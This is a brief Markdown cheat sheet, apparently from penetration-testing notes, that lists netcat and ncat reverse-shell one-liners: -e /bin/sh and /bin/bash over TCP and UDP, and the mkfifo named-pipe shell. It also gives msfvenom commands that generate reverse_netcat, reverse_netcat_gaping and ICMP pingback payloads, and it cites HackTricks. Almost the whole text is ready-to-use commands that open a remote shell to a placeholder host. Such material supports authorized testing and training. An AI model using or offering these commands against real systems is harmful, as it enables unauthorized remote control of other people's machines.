# Netcat

## 01 - One-liners

### 1.1 - Traditional GNU Method

```
$ nc <IP> <PORT> -e /bin/sh

$ nc <IP> <PORT> -e /bin/bash
```

### 1.2 - Ncat

TCP method.

```
$ ncat <IP> <PORT> -e /bin/bash
```

UDP method.

```
$ ncat -u <IP> <PORT> -e /bin/bash
```

### 1.3 - OpenBSD Method

```
$ mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP> <PORT> > /tmp/f; rm /tmp/f

$ mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > /tmp/f; rm /tmp/f
```

## 02 - Generate a payload via `msfvenom`

### 2.1 - OpenBSD Method

```
$ msfvenom -p cmd/unix/reverse_netcat lhost=<IP> lport=<PORT>
```

### 2.2 - Traditional GNU Method

```
$ msfvenom -p cmd/unix/reverse_netcat_gaping lhost=<IP> lport=<PORT>
```

### 2.3 - ICMP Method

```
$ msfvenom -p cmd/unix/pingback_reverse lhost=<IP> lport=<PORT>
```

---
## References

### Hacktricks

- [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)